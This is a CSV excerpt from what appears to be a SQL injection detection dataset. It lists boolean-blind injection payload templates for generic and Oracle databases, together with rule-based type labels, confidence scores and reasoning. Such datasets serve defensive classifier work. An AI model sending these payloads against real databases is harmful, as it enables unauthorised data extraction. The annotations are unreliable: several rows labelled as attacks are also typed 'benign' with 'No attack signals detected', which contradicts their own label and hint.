row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41100,"OR EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) OR EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",1,boolean_blind,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
41101,AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL,1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41102,OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL,1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41103,"AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",1,boolean_blind,error_based,oracle,0.95,CTXSYS detected — error_based injection (priority 4) on oracle,rule-based
41104,"OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL",1,boolean_blind,error_based,oracle,0.95,CTXSYS detected — error_based injection (priority 4) on oracle,rule-based
41105,AND CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END AND CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END,1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41106,OR CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END OR CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END,1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41107,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),1,boolean_blind,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
41108,"MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) MAKE_SET([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41109,"MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE]) MAKE_SET([INFERENCE],[ORIGVALUE])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
